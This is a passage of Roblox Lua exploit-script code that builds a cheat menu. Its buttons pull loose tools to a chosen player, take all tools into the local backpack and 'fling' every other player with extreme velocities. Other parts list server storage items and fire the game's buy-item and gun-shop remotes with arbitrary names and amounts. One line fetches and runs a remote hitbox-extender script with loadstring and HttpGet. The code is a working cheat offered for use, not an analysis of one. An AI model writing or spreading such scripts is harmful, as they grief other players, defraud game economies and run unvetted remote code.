		warn("No player specified or player not found.")
		return
	end

	local root = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
	if not root then
		warn("Target player has no HRP")
		return
	end

	for _, v in ipairs(Workspace:GetDescendants()) do
		if v:IsA("Tool") or (v:IsA("BasePart") and v.Name == "Handle") then
			local tool = v:IsA("Tool") and v or v:FindFirstAncestorWhichIsA("Tool")
			if tool and tool:IsDescendantOf(Workspace) and not tool:FindFirstChildOfClass("Humanoid") then
				local handle = tool:FindFirstChild("Handle")
				if handle and not handle.Anchored and isToolAllowed(tool) then
					if handle:FindFirstChild("BodyVelocity") then handle.BodyVelocity:Destroy() end
					local bv = Instance.new("BodyVelocity")
					bv.Velocity = (root.Position - handle.Position).Unit * 100
					bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
					bv.P = 10000
					bv.Parent = handle
					Debris:AddItem(bv, 0.5)
				end
			end
		end
	end
end

-- Grab Tools to Backpack
local function grabToolsToBackpack()
	for _, v in ipairs(Workspace:GetDescendants()) do
		if v:IsA("Tool") and v:FindFirstChild("Handle") and not v.Handle.Anchored and isToolAllowed(v) then
			v.Parent = LocalPlayer.Backpack
		end
	end
end

-- TP Button
local TPButton = Instance.new("TextButton", Frame)
TPButton.Size = UDim2.new(1, -20, 0, 30)
TPButton.Position = UDim2.new(0, 10, 1, -75)
TPButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
TPButton.Text = "Teleport Unanchored To Player"
TPButton.TextColor3 = Color3.new(0,0,0)
TPButton.Font = Enum.Font.GothamBold
TPButton.TextSize = 13
Instance.new("UICorner", TPButton)

-- Grab Button
local GrabButton = Instance.new("TextButton", Frame)
GrabButton.Size = UDim2.new(1, -20, 0, 30)
GrabButton.Position = UDim2.new(0, 10, 1, -40)
GrabButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
GrabButton.Text = "Grab Tools"
GrabButton.TextColor3 = Color3.new(0,0,0)
GrabButton.Font = Enum.Font.GothamBold
GrabButton.TextSize = 13
Instance.new("UICorner", GrabButton)

-- Button Events
TPButton.MouseButton1Click:Connect(function()
	local inputName = UsernameBox.Text
	if inputName == "" then
		warn("No username entered.")
		return
	end

	local targetPlayer = Players:FindFirstChild(inputName)
	if not targetPlayer then
		warn("Player not found: " .. inputName)
		return
	end

	teleportToolsToPlayer(targetPlayer)
end)

GrabButton.MouseButton1Click:Connect(grabToolsToBackpack)
end)

addMainMenuButton("FLING ALL (MONSY)", function()
	game:GetService("StarterGui"):SetCore("SendNotification",{
    Title = "Script Executed";
    Text = "Fling All";
    Duration = 6;
})
 
local Targets = {"All"} -- "All", "Target Name", "arian_was_here"
 
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
 
local AllBool = false
 
local GetPlayer = function(Name)
    Name = Name:lower()
    if Name == "all" or Name == "others" then
        AllBool = true
        return
    elseif Name == "random" then
        local GetPlayers = Players:GetPlayers()
        if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
        return GetPlayers[math.random(#GetPlayers)]
    elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
        for _,x in next, Players:GetPlayers() do
            if x ~= Player then
                if x.Name:lower():match("^"..Name) then
                    return x;
                elseif x.DisplayName:lower():match("^"..Name) then
                    return x;
                end
            end
        end
    else
        return
    end
end
 
local Message = function(_Title, _Text, Time)
    game:GetService("StarterGui"):SetCore("SendNotification", {Title = _Title, Text = _Text, Duration = Time})
end
 
local SkidFling = function(TargetPlayer)
    local Character = Player.Character
    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
    local RootPart = Humanoid and Humanoid.RootPart
 
    local TCharacter = TargetPlayer.Character
    local THumanoid
    local TRootPart
    local THead
    local Accessory
    local Handle
 
    if TCharacter:FindFirstChildOfClass("Humanoid") then
        THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
    end
    if THumanoid and THumanoid.RootPart then
        TRootPart = THumanoid.RootPart
    end
    if TCharacter:FindFirstChild("Head") then
        THead = TCharacter.Head
    end
    if TCharacter:FindFirstChildOfClass("Accessory") then
        Accessory = TCharacter:FindFirstChildOfClass("Accessory")
    end
    if Accessoy and Accessory:FindFirstChild("Handle") then
        Handle = Accessory.Handle
    end
 
    if Character and Humanoid and RootPart then
        if RootPart.Velocity.Magnitude < 50 then
            getgenv().OldPos = RootPart.CFrame
        end
        if THumanoid and THumanoid.Sit and not AllBool then
            return Message("Error Occurred", "Targeting is sitting", 5) -- u can remove dis part if u want lol
        end
        if THead then
            workspace.CurrentCamera.CameraSubject = THead
        elseif not THead and Handle then
            workspace.CurrentCamera.CameraSubject = Handle
        elseif THumanoid and TRootPart then
            workspace.CurrentCamera.CameraSubject = THumanoid
        end
        if not TCharacter:FindFirstChildWhichIsA("BasePart") then
            return
        end
 
        local FPos = function(BasePart, Pos, Ang)
            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
            Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
            RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
        end
 
        local SFBasePart = function(BasePart)
            local TimeToWait = 2
            local Time = tick()
            local Angle = 0
 
            repeat
                if RootPart and THumanoid then
                    if BasePart.Velocity.Magnitude < 50 then
                        Angle = Angle + 100
 
                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
                    else
                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()
                    end
                else
                    break
                end
            until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
        end
 
        workspace.FallenPartsDestroyHeight = 0/0
 
        local BV = Instance.new("BodyVelocity")
        BV.Name = "EpixVel"
        BV.Parent = RootPart
        BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
        BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
 
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
 
        if TRootPart and THead then
            if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
                SFBasePart(THead)
            else
                SFBasePart(TRootPart)
            end
        elseif TRootPart and not THead then
            SFBasePart(TRootPart)
        elseif not TRootPart and THead then
            SFBasePart(THead)
        elseif not TRootPart and not THead and Accessory and Handle then
            SFBasePart(Handle)
        else
            return Message("Error Occurred", "Target is missing everything", 5)
        end
 
        BV:Destroy()
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        workspace.CurrentCamera.CameraSubject = Humanoid
 
        repeat
            RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
            Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
            Humanoid:ChangeState("GettingUp")
            table.foreach(Character:GetChildren(), function(_, x)
                if x:IsA("BasePart") then
                    x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
                end
            end)
            task.wait()
        until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
        workspace.FallenPartsDestroyHeight = getgenv().FPDH
    else
        return Message("Error Ocurrido", "El Script A Fallado", 5)
    end
end
 
if not Welcome then Message("By Augus X", "", 6) end
getgenv().Welcome = true
if Targets[1] then for _,x in next, Targets do GetPlayer(x) end else return end
 
if AllBool then
    for _,x in next, Players:GetPlayers() do
        SkidFling(x)
    end
end
 
for _,x in next, Targets do
    if GetPlayer(x) and GetPlayer(x) ~= Player then
        if GetPlayer(x).UserId ~= 2924145477 then
            local TPlayer = GetPlayer(x)
            if TPlayer then
                SkidFling(TPlayer)
            end
        else
            Message("ERROR AL ASER FLING", "", 8)
        end
    elseif not GetPlayer(x) and not AllBool then
        Message("ERROR OCURRIDO", "NO SE LE ISO FLING", 8)
    end
end
end)

addMainMenuButton("HITBOX EXTENDER (MONSY)", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/LisSploit/HitBoxExtender/main/Universal",true))()
end)

local function addMainMenuButton(text, callback)
	local panel = allTabPanels["ROLEPLAY MENU"]
	if not panel then return end
	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(245,245,245),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.GothamSemibold,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})
	btn.MouseEnter:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(230,230,230)}):Play()
	end)
	btn.MouseLeave:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(245,245,245)}):Play()
	end)
	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 8 Buttons in Main Menu
addMainMenuButton("STORAGE SYSTEM VIEWER FOR ALL CITY (MONSY)", function()
    -- LocalScript: StorageSystem Tools Viewer (All Black + Copyable Tools + Hide with O)
-- Place in StarterPlayerScripts or StarterGui

--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

--// Find StorageSystem
local storageSystem = ReplicatedStorage:FindFirstChild("StorageSystem")
if not storageSystem then
    warn("❌ 'StorageSystem' not found in ReplicatedStorage.")
    return
end

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "StorageSystemToolsViewer"
gui.ResetOnSpawn = false
gui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 400, 0, 340)
frame.Position = UDim2.new(0.5, -200, 0.25, 0)
frame.Active = true
frame.Draggable = true
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Parent = gui
frame.AnchorPoint = Vector2.new(0.5, 0)

-- Rounded corners
local corner = Instance.new("UICorner", frame)
corner.CornerRadius = UDim.new(0, 12)

-- subtle shadow frame
local shadow = Instance.new("Frame", frame)
shadow.Size = UDim2.new(1, 0, 1, 0)
shadow.Position = UDim2.new(0, 4, 0, 4)
shadow.BackgroundColor3 = Color3.fromRGB(10,10,10)
shadow.ZIndex = -1
shadow.BorderSizePixel = 0

-- Title bar
local titleBar = Instance.new("Frame", frame)
titleBar.Size = UDim2.new(1, 0, 0, 35)
titleBar.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
titleBar.BorderSizePixel = 0
local titleCorner = Instance.new("UICorner", titleBar)
titleCorner.CornerRadius = UDim.new(0, 12)
titleCorner.Name = "TitleCorner"

local title = Instance.new("TextLabel", titleBar)
title.Size = UDim2.new(1, 0, 1, 0)
title.BackgroundTransparency = 1
title.Text = "StorageSystem Viewer"
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.TextColor3 = Color3.fromRGB(0,0,0)

local info = Instance.new("TextLabel", frame)
info.Size = UDim2.new(1, -10, 0, 20)
info.Position = UDim2.new(0, 5, 0, 40)
info.BackgroundTransparency = 1
info.Text = "   Click a tool to copy its name  |  Press [O] to hide/show"
info.Font = Enum.Font.Gotham
info.TextSize = 13
info.TextColor3 = Color3.fromRGB(180, 180, 180)
info.TextXAlignment = Enum.TextXAlignment.Left

local scrolling = Instance.new("ScrollingFrame", frame)
scrolling.Size = UDim2.new(1, -20, 1, -70)
scrolling.Position = UDim2.new(0, 10, 0, 65)
scrolling.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
scrolling.BorderSizePixel = 0
scrolling.ScrollBarThickness = 6
scrolling.CanvasSize = UDim2.new(0, 0, 0, 0)

local layout = Instance.new("UIListLayout", scrolling)
layout.Padding = UDim.new(0, 6)
layout.SortOrder = Enum.SortOrder.LayoutOrder

--// Helper Functions
local function clearList()
    for _, child in ipairs(scrolling:GetChildren()) do
        if child:IsA("TextButton") then
            child:Destroy()
        end
    end
end

local function copyToClipboard(text)
    if setclipboard then
        setclipboard(text)
    elseif writeclipboard then
        writeclipboard(text)
    else
        warn("Clipboard copy not supported in this environment.")
    end
end

local function addToolLine(tool)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, -8, 0, 26)
    btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    btn.TextColor3 = Color3.fromRGB(0,0,0)
    btn.TextXAlignment = Enum.TextXAlignment.Left
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 14
    btn.Text = " " .. tool.Name
    btn.AutoButtonColor = false
    btn.Parent = scrolling

    local corner = Instance.new("UICorner", btn)
    corner.CornerRadius = UDim.new(0, 6)

    -- Hover effect
    btn.MouseEnter:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    end)
    btn.MouseLeave:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    end)

    -- Click to copy
    btn.MouseButton1Click:Connect(function()
        copyToClipboard(tool.Name)
        btn.TextColor3 = Color3.fromRGB(0, 255, 0)
        btn.Text = " Copied: " .. tool.Name
        task.wait(0.8)
        btn.Text = " " .. tool.Name
        btn.TextColor3 = Color3.fromRGB(0,0,0)
    end)
end

local function rebuildList()
    clearList()
    local tools = {}
    for _, inst in ipairs(storageSystem:GetDescendants()) do
        if inst:IsA("Tool") then
            table.insert(tools, inst)
        end
    end
    table.sort(tools, function(a,b) return a.Name:lower() < b.Name:lower() end)
    for _, t in ipairs(tools) do
        addToolLine(t)
    end
    scrolling.CanvasSize = UDim2.new(0, 0, 0, #tools * 32)
end

--// Build + Live Update
rebuildList()
storageSystem.DescendantAdded:Connect(function(obj)
    if obj:IsA("Tool") then rebuildList() end
end)
storageSystem.DescendantRemoving:Connect(function(obj)
    if obj:IsA("Tool") then rebuildList() end
end)

--// Toggle GUI visibility with "K"
local visible = true
UserInputService.InputBegan:Connect(function(input, gpe)
	if gpe then return end
	if input.KeyCode == Enum.KeyCode.K then
		visible = not visible
		gui.Enabled = visible
	end
end)

print("✅ StorageSystem Tools Viewer loaded (Press O to toggle, click to copy).")
end)

--// 8 Buttons in Main Menu
addMainMenuButton("BAGONG BARYO OPEN THIS + BUY ITEM REMOTE (MONSY)", function()
	-- LocalScript: GunEngineAssets.WeaponModels Viewer (NO DUPLICATES)
-- Place in StarterPlayer > StarterPlayerScripts

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Wait for path
local gunEngine = ReplicatedStorage:WaitForChild("GunEngineAssets", 5)
local weaponModels = gunEngine and gunEngine:WaitForChild("WeaponModels", 5)
if not weaponModels then
	warn("GunEngineAssets.WeaponModels not found!")
	return
end

-- GUI
local gui = Instance.new("ScreenGui")
gui.Name = "WeaponModelsViewer"
gui.ResetOnSpawn = false
gui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 450, 0, 420)
frame.Position = UDim2.new(0.5, -225, 0.25, 0)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = frame

-- Title
local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 35)
titleBar.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
titleBar.BorderSizePixel = 0
titleBar.Parent = frame

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 12)
titleCorner.Parent = titleBar

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 1, 0)
title.BackgroundTransparency = 1
title.Text = "WeaponModels Viewer"
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Parent = titleBar

-- Info
local info = Instance.new("TextLabel")
info.Size = UDim2.new(1, -20, 0, 20)
info.Position = UDim2.new(0, 10, 0, 40)
info.BackgroundTransparency = 1
info.Text = "Click to copy name | Press O to toggle"
info.Font = Enum.Font.Gotham
info.TextSize = 13
info.TextColor3 = Color3.fromRGB(180, 180, 180)
info.TextXAlignment = Enum.TextXAlignment.Left
info.Parent = frame

-- Scrolling
local scrolling = Instance.new("ScrollingFrame")
scrolling.Size = UDim2.new(1, -20, 1, -75)
scrolling.Position = UDim2.new(0, 10, 0, 65)
scrolling.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
scrolling.BorderSizePixel = 0
scrolling.ScrollBarThickness = 6
scrolling.CanvasSize = UDim2.new(0, 0, 0, 0)
scrolling.Parent = frame

local layout = Instance.new("UIListLayout")
layout.Padding = UDim.new(0, 8)
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.Parent = scrolling

-- Copy
local function copy(text)
	if setclipboard then setclipboard(text)
	elseif writeclipboard then writeclipboard(text) end
end

-- Clear
local function clear()
	for _, v in scrolling:GetChildren() do
		if v:IsA("GuiObject") then v:Destroy() end
	end
end

-- Icon
local function getIcon(obj)
	if obj:IsA("Tool") then return "Tool"
	elseif obj:IsA("Model") then return "Model"
	elseif obj:IsA("Folder") then return "Folder"
	elseif obj:IsA("Part") then return "Part"
	else return "Item"
	end
end

-- Add Header
local function addHeader(name)
	local lbl = Instance.new("TextLabel")
	lbl.Size = UDim2.new(1, -10, 0, 30)
	lbl.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	lbl.Text = " " .. name
	lbl.Font = Enum.Font.GothamBold
	lbl.TextSize = 14
	lbl.TextColor3 = Color3.fromRGB(100, 200, 255)
	lbl.TextXAlignment = Enum.TextXAlignment.Left
	lbl.Parent = scrolling

	local c = Instance.new("UICorner")
	c.CornerRadius = UDim.new(0, 6)
	c.Parent = lbl
end

-- Add Item
local function addItem(item)
	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(1, -20, 0, 28)
	btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	btn.TextColor3 = Color3.fromRGB(220, 220, 220)
	btn.TextXAlignment = Enum.TextXAlignment.Left
	btn.Font = Enum.Font.Gotham
	btn.TextSize = 13
	btn.Text = "   " .. getIcon(item) .. " " .. item.Name
	btn.AutoButtonColor = false
	btn.Parent = scrolling

	local c = Instance.new("UICorner")
	c.CornerRadius = UDim.new(0, 5)
	c.Parent = btn

	-- Hover
	btn.MouseEnter:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(35, 35, 35) end)
	btn.MouseLeave:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20) end)

	-- Click to copy
	btn.MouseButton1Click:Connect(function()
		copy(item.Name)
		local oldText = btn.Text
		btn.TextColor3 = Color3.fromRGB(0, 255, 0)
		btn.Text = "   Copied: " .. item.Name
		task.wait(0.7)
		btn.Text = oldText
		btn.TextColor3 = Color3.fromRGB(220, 220, 220)
	end)
end

-- Rebuild (NO DUPLICATES)
local function rebuild()
	clear()

	local seen = {}  -- Prevent duplicates
	local folderMap = {}

	-- Only scan direct children of WeaponModels
	for _, child in ipairs(weaponModels:GetChildren()) do
		local name = child.Name
		if not seen[name] then
			seen[name] = true

			if child:IsA("Folder") then
				-- Folder → collect its children
				folderMap[child.Name] = folderMap[child.Name] or {}
				for _, item in ipairs(child:GetChildren()) do
					table.insert(folderMap[child.Name], item)
				end
			else
				-- Direct item → put in "Main"
				folderMap["Main"] = folderMap["Main"] or {}
				table.insert(folderMap["Main"], child)
			end
		end
	end

	-- Sort folders
	local folders = {}
	for folderName, _ in pairs(folderMap) do
		table.insert(folders, folderName)
	end
	table.sort(folders)

	-- Build UI
	local y = 0
	for _, folderName in ipairs(folders) do
		local items = folderMap[folderName]
		if #items > 0 then
			addHeader(folderName)
			y += 38

			table.sort(items, function(a,b) return a.Name:lower() < b.Name:lower() end)

			for _, item in ipairs(items) do
				addItem(item)
				y += 36
			end
		end
	end

	scrolling.CanvasSize = UDim2.new(0, 0, 0, y + 20)
end

-- Initial
task.spawn(rebuild)

-- Live Update (debounced)
local updating = false
local function update()
	if updating then return end
	updating = true
	task.wait(0.2)
	rebuild()
	updating = false
end

weaponModels.ChildAdded:Connect(update)
weaponModels.ChildRemoved:Connect(update)
weaponModels.DescendantAdded:Connect(update)
weaponModels.DescendantRemoving:Connect(update)

-- Toggle O
local visible = true
UserInputService.InputBegan:Connect(function(input, gp)
	if gp then return end
	if input.KeyCode == Enum.KeyCode.O then
		visible = not visible
		gui.Enabled = visible
	end
end)

print("BURAT MONSY")
end)

--// 8 Buttons in Main Menu
addMainMenuButton("BUYITEM REMOTE FOR ALL CITY (MONSY)", function()
    -- LocalScript: All-black draggable BUY GUI (centered title + auto-clear textboxes)
-- Place this in StarterGui or StarterPlayerScripts

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

--// Find the remote to use
local buyRemote = ReplicatedStorage:FindFirstChild("BuyItemRemote") or ReplicatedStorage:FindFirstChild("AntiExploit")

--// GUI
local gui = Instance.new("ScreenGui")
gui.Name = "CashMenuGUI"
gui.ResetOnSpawn = false
gui.Parent = playerGui

--// Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 200)
frame.Position = UDim2.new(0.5, -150, 0.5, -100)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

--// Title
local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.Text = "PUBLIC ENEMY"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.TextWrapped = true
title.TextXAlignment = Enum.TextXAlignment.Center
title.TextYAlignment = Enum.TextYAlignment.Center

--// Item Name TextBox
local itemBox = Instance.new("TextBox", frame)
itemBox.Size = UDim2.new(1, -20, 0, 35)
itemBox.Position = UDim2.new(0, 10, 0, 55)
itemBox.PlaceholderText = "Enter Item Name"
itemBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
itemBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
itemBox.TextColor3 = Color3.fromRGB(0,0,0)
itemBox.Font = Enum.Font.Gotham
itemBox.TextSize = 14
Instance.new("UICorner", itemBox).CornerRadius = UDim.new(0, 6)
itemBox.ClearTextOnFocus = true -- auto clear when clicked

--// Amount TextBox
local amountBox = Instance.new("TextBox", frame)
amountBox.Size = UDim2.new(1, -20, 0, 35)
amountBox.Position = UDim2.new(0, 10, 0, 100)
amountBox.PlaceholderText = "Enter Amount"
amountBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.fromRGB(0,0,0)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 14
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)
amountBox.ClearTextOnFocus = true -- auto clear when clicked

--// Send Button
local sendButton = Instance.new("TextButton", frame)
sendButton.Size = UDim2.new(1, -20, 0, 40)
sendButton.Position = UDim2.new(0, 10, 0, 145)
sendButton.Text = "BUY"
sendButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
sendButton.TextColor3 = Color3.fromRGB(0,0,0)
sendButton.Font = Enum.Font.GothamBold
sendButton.TextSize = 16
Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 6)

--// Feedback Text
local feedback = Instance.new("TextLabel", frame)
feedback.Size = UDim2.new(1, -20, 0, 20)
feedback.Position = UDim2.new(0, 10, 1, -22)
feedback.BackgroundTransparency = 1
feedback.Font = Enum.Font.Gotham
feedback.TextSize = 12
feedback.TextColor3 = Color3.fromRGB(200, 200, 200)
feedback.Text = ""

local function showFeedback(msg, t)
	feedback.Text = msg
	task.delay(t or 2, function()
		if feedback then feedback.Text = "" end
	end)
end

--// Buy Logic
local function buyItem()
	local item = itemBox.Text
	local amount = tonumber(amountBox.Text)

	if item == "" or not amount then
		showFeedback("Invalid input!", 2)
		return
	end

	if not buyRemote then
		showFeedback("Remote not found!", 2)
		return
	end

	buyRemote:FireServer(item, amount)
	showFeedback("Sent: " .. item .. " x" .. amount, 2)
end

sendButton.MouseButton1Click:Connect(buyItem)
itemBox.FocusLost:Connect(function(enter) if enter then buyItem() end end)
amountBox.FocusLost:Connect(function(enter) if enter then buyItem() end end)

-- Hover effect (slight brightening)
sendButton.MouseEnter:Connect(function()
	sendButton.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
end)
sendButton.MouseLeave:Connect(function()
	sendButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GUNSHOP REMOTE FOR ALL CITY (MONSY)", function()
    -- LocalScript: PUBLIC ENEMY CASH MENU (GunShop Purchase System)
-- Place inside StarterGui or StarterPlayerScripts

--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

--// Remote setup
local purchaseEvent = ReplicatedStorage:WaitForChild("GunShop"):WaitForChild("Events"):WaitForChild("Purchase")

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "TaongGomaCashMenu"
gui.ResetOnSpawn = false
gui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 200)
frame.Position = UDim2.new(0.5, -150, 0.5, -100)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

--// Title
local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.Text = "PUBLIC ENEMY"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.TextWrapped = true
title.TextXAlignment = Enum.TextXAlignment.Center
title.TextYAlignment = Enum.TextYAlignment.Center

--// Item Name TextBox
local itemBox = Instance.new("TextBox", frame)
itemBox.Size = UDim2.new(1, -20, 0, 35)
itemBox.Position = UDim2.new(0, 10, 0, 55)
itemBox.PlaceholderText = "Enter Item Name"
itemBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
itemBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
itemBox.TextColor3 = Color3.fromRGB(0,0,0)
itemBox.Font = Enum.Font.Gotham
itemBox.TextSize = 14
itemBox.ClearTextOnFocus = true
Instance.new("UICorner", itemBox).CornerRadius = UDim.new(0, 6)

--// Amount TextBox
local amountBox = Instance.new("TextBox", frame)
amountBox.Size = UDim2.new(1, -20, 0, 35)
amountBox.Position = UDim2.new(0, 10, 0, 100)
amountBox.PlaceholderText = "Enter Amount"
amountBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.fromRGB(0,0,0)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 14
amountBox.ClearTextOnFocus = true
